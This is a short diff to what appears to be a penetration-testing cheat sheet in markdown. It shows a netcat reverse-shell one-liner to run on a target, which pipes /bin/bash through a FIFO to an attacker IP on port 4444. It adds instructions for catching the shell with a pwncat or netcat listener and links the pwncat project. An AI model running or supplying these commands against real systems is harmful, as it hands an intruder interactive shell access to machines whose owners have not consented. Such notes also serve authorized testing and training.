@@ -4,6 +4,11 @@ on target
 ```
 rm /tmp/f; mkfifo /tmp/f; nc $ip 4444 0</tmp/f | /bin/bash >/tmp/f 2>$1
 ```
+on attacker use pwncat Johnhammond
+```
+python -m pwncat -lp 4444
+```
+or only nc
 #### pwncat by John Hammond
 https://github.com/calebstewart/pwncat
 
